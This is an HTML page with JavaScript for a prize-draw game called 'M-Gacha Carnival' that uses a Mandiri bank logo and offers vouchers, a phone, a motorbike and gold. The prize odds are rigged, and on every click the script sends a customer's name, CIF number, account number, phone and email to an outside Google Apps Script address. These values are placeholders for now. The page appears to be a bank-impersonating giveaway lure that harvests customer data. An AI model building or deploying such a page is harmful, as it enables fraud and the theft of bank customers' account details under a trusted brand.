<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>M-Gacha Carnival</title>
  <link rel="icon" href="assets/gift-box.png" />
  <style>
    body {
      margin: 0;
      padding: 0;
      background: url("assets/background.png") no-repeat center center fixed;
      background-size: cover;
      font-family: 'Arial', sans-serif;
      color: white;
      text-align: center;
    }

    .logo {
      width: 140px;
      margin: 10px auto 0;
      display: block;
    }

    .menu-buttons {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin: 10px auto;
    }

    .menu-buttons button {
      padding: 10px 18px;
      border-radius: 14px;
      border: none;
      cursor: pointer;
      background: white;
      color: black;
      font-weight: bold;
      box-shadow: 0 3px 6px rgba(0,0,0,0.2);
    }

    .status {
      margin-top: 10px;
      font-size: 18px;
    }

    .status .emoji {
      font-size: 20px;
    }

    .info {
      margin-top: 5px;
      font-size: 14px;
    }

    .gift-container {
      display: grid;
      grid-template-columns: repeat(2, 120px);
      grid-template-rows: repeat(2, 120px);
      gap: 24px 24px;
      justify-content: center;
      align-items: center;
      margin: 20px auto;
    }

    .gift-box {
      width: 120px;
      height: 120px;
      background: url("assets/gift-box.png") no-repeat center center;
      background-size: contain;
      cursor: pointer;
    }

    #rewardPopup {
      display: none;
      position: fixed;
      top: 40%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      color: black;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 12px rgba(0,0,0,0.3);
      z-index: 10;
    }

    #rewardPopup button {
      margin-top: 10px;
      padding: 8px 14px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <img src="assets/logo-mandiri.png" alt="Mandiri Logo" class="logo" />

  <div class="menu-buttons">
    <button onclick="togglePrizeList()">üéÅ Daftar Hadiah</button>
    <button onclick="toggleHistory()">üì¶ HadiahMu</button>
  </div>

  <div class="status">
    <div class="emoji">üòä</div>
    <div id="pointsDisplay">M-Gacha Poin: 10</div>
    <div id="chancesDisplay">Kesempatan Hari ini: 10x</div>
    <div class="info">Tukarkan 2 poin untuk 1x kesempatan</div>
  </div>

  <div class="gift-container" id="giftContainer"></div>

  <div id="rewardPopup"></div>

  <!-- Daftar Hadiah -->
  <div id="prizeList" style="display:none; position:fixed; top:10%; right:10px; background:white; color:black; padding:15px; border-radius:8px; z-index:9;">
    <b>üéÅ Daftar Hadiah:</b><br>
    <ul style="text-align:left; padding-left: 18px;">
      <li>+3 M-Gacha Poin</li>
      <li>i-Voucher Indomaret Rp 50.000</li>
      <li>i-Voucher Indomaret Rp 100.000</li>
      <li>Voucher Alfamart Rp 50.000</li>
      <li>Voucher Alfamart Rp 100.000</li>
      <li>Voucher Grab Rp 50.000</li>
      <li>Iphone 15 128GB</li>
      <li>Samsung Smart TV 32"</li>
      <li>Honda Vario 125 CBS ISS</li>
      <li>Logam Mulia 1gr</li>
    </ul>
  </div>

  <!-- HadiahMu -->
  <div id="historyPopup" style="display:none; position:fixed; top:10%; left:10px; background:white; color:black; padding:15px; border-radius:8px; z-index:9;">
    <b>üì¶ HadiahMu:</b>
    <ul id="historyList" style="text-align:left; padding-left:18px;"></ul>
  </div>

  <audio id="sound" src="assets/arcade-sound.mp3" preload="auto"></audio>

  <script>
    const giftContainer = document.getElementById("giftContainer");
    const pointsDisplay = document.getElementById("pointsDisplay");
    const chancesDisplay = document.getElementById("chancesDisplay");
    const rewardPopup = document.getElementById("rewardPopup");
    const historyList = document.getElementById("historyList");
    const sound = document.getElementById("sound");

    let points = 10;
    let chances = 10;
    let history = [];

    const rewards = [
      ...Array(98).fill("+3 M-Gacha Poin"),
      "i-Voucher Indomaret Rp 50.000",
      "i-Voucher Indomaret Rp 100.000",
      "Voucher Alfamart Rp 50.000",
      "Voucher Alfamart Rp 100.000",
      "Voucher Grab Rp 50.000",
      "Iphone 15 128GB",
      "Samsung Smart TV 32\"",
      "Honda Vario 125 CBS ISS",
      "Logam Mulia 1gr"
    ];

    const dummyUser = {
      nama: "Demo Nasabah",
      cif: "1234567890",
      norek: "1234567890123456",
      hp: "081234567890",
      email: "demo@email.com"
    };

    function updateDisplay() {
      pointsDisplay.innerHTML = `M-Gacha Poin: ${points}`;
      chancesDisplay.innerHTML = `Kesempatan Hari ini: ${chances}x`;
    }

    function showRewardPopup(reward) {
      rewardPopup.innerHTML = `<div>üéâ Kamu mendapat:<br><b>${reward}</b></div><br><button onclick="closeRewardPopup()">Main Lagi</button>`;
      rewardPopup.style.display = "block";
    }

    function closeRewardPopup() {
      rewardPopup.style.display = "none";
    }

    function togglePrizeList() {
      const el = document.getElementById("prizeList");
      el.style.display = el.style.display === "none" ? "block" : "none";
    }

    function toggleHistory() {
      const el = document.getElementById("historyPopup");
      el.style.display = el.style.display === "none" ? "block" : "none";
    }

    function createGiftBox(index) {
      const box = document.createElement("div");
      box.className = "gift-box";
      box.onclick = () => {
        if (points < 2 || chances <= 0) {
          alert("Kamu kehabisan kesempatan atau poin.");
          return;
        }

        sound.play();
        chances--;
        points -= 2;

        const reward = rewards[Math.floor(Math.random() * rewards.length)];
        if (reward === "+3 M-Gacha Poin") {
          points += 3;
        }

        history.push(reward);
        updateDisplay();
        showRewardPopup(reward);

        const li = document.createElement("li");
        li.textContent = reward;
        historyList.appendChild(li);

        fetch("https://script.google.com/macros/s/AKfycbwYHTbpOPV0P3qwu06kgDZA3hnNJABi16ofPkBn48kV9cmo_zV-ieSYtbCzBwkooA1P/exec", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            timestamp: new Date().toLocaleString(),
            nama: dummyUser.nama,
            cif: dummyUser.cif,
            norek: dummyUser.norek,
            hp: dummyUser.hp,
            email: dummyUser.email,
            reward: reward
          })
        });
      };
      return box;
    }

    function renderGifts() {
      giftContainer.innerHTML = "";
      for (let i = 0; i < 4; i++) {
        giftContainer.appendChild(createGiftBox(i));
      }
    }

    renderGifts();
    updateDisplay();
  </script>
</body>
</html>
